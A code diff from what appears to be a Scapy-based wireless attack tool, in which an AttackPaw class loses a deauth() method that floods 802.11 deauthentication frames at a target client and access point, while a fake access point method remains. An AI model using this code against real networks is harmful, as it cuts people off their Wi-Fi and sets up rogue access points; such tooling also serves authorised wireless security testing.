@@ -4,7 +4,7 @@ from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon
 from scapy.sendrecv import sendp
 
 from objects.accesspoint import AccessPoint
-from objects.interface import Interface
+from objects.interfaces import Interface
 
 from paws.util_paw import UtilPaw
 from paws.iface_paw import IfacePaw
@@ -60,26 +60,6 @@ class AttackPaw(IfacePaw):
     
     def get_random_mac_address(self) -> str:
         return str(RandMAC())
-    
-    def deauth(self) -> None:
-
-        # 802.11 frame
-        dot11 = Dot11(
-            addr1=self._target_mac, # destination MAC
-            addr2=self._target_network_mac, # source MAC
-            addr3=self._target_network_mac, # Access Point MAC
-        )
-        # stack them up
-        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-        # send the packet
-        sendp(
-            x=packet,
-            inter=self._interval,
-            count=self._count,
-            loop=not self._count,
-            iface=self._interface,
-            verbose=True,
-        )
     
     def fake_ap(self) -> None:
         access_point = AccessPoint(
